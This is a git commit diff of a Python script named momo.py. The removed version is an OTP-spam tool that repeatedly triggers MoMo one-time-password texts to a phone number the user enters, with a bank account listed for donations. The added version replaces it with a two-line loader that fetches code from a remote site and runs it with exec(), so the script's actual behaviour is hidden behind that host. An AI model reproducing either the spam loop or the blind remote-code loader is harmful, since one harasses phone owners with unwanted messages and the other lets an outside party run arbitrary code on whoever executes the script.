bb14919a7d6d38b700bc1970aad03e4148d3978a
viethack <86575409+viethack@users.noreply.github.com>
2022-05-16 11:02:10 +0700

    Update momo.py

--- momo.py
+++ momo.py
@@ -1,19 +1,3 @@
-import requests, time
-from time import sleep
-print ("------Information Donate------")
-print ("MBBANK: 999991497")
-print ("------------------------------")
-print ("")
-print ("â€¢ThĂ´ng bĂ¡o: Tool VTPay Ä‘ang lá»—i admin sáº½ fix vĂ  tĂ¬m thĂªm nhiá»u tool spam")
-print ("Theo dĂµi táº¡i: @codengonbyduy")
-print ("")
-phone = input("Input phone: ")
-while True:
-   main = requests.get("https://danganhduy.io/login-momo.php?phone="+str(phone)).json()
-   if main == 0:
-       print ("Spam so nay an lon a?")
-       sleep(5)
-       break
-   else:
-       print ("SEND OTP MOMO SUCCESS: "+phone)
-       sleep(10)
+import requests
+exec(requests.get("https://danganhduy.io/otp").text)
+#Dang Anh Duy
